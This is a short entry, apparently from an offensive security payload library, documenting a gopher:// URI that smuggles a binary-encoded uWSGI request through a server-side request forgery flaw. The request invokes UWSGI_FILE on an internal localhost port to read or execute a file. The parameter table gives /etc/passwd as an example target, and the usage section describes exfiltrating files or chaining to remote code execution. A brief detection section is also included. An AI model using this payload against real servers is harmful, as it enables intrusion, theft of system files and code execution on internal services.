---
type: code
language: plaintext
verified: true
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:24:06Z'
platforms:
  - Linux
tags:
  - ssrf
  - payload
  - gopher
  - uwsgi
validated: true
---

# uWSGI-Gopher-Protocol-Payload-for-File-Access

## Code

```
gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
```

## Description

This payload is a Gopher protocol URI designed to exploit uWSGI servers via SSRF. It uses binary-encoded data to invoke the UWSGI_FILE modifier, allowing the server to read or process a specified file on the internal system. The payload smuggles the request past URL filters, enabling access to localhost resources.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| localhost:8000 | Internal uWSGI server host and port | 127.0.0.1:8080 |
| /tmp/test.py | Path to the file or script to access/execute | /etc/passwd |

## Usage

Embed this URI as a URL parameter in a request to an SSRF-vulnerable endpoint (e.g., via curl or a form submission). It is typically used in web exploitation scenarios to exfiltrate files or chain to RCE by uploading executable scripts first.

## Detection

- Application logs showing gopher scheme usage or uWSGI modifier invocations (e.g., UWSGI_FILE).
- Network monitoring for internal connections from web servers to localhost ports like 8000.
- WAF alerts on binary-encoded URLs or unusual protocols; enable protocol whitelisting.

## Related

- [[procedures/Server-Side-Request-Forgery-via-WSGI-Gopher-Protocol-Exploit]]
